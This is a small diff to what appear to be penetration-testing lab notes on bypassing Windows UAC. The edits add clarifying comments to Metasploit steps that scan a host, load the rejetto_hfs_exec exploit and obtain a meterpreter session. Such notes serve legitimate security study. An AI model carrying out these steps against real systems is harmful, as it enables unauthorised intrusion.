@@ -24,11 +24,11 @@ Bypassing UAC With UACMe
 - in windows search for uac
 - set the security level from GUI
 #### Exploiting
-- nmap 10.2.22.220 [ this will all the services]
+- nmap 10.2.22.220 [ this will list all the services]
 - service postgresql start
 - msfconsole
 - setg RHOSTS 10.2.22.220
-- search rejetto
+- search rejetto [ as rejetto is running on the server]
 - use exploit/windows/http/rejetto_hfs_exec 
 - set everything requires
 - this will give meterpreter session
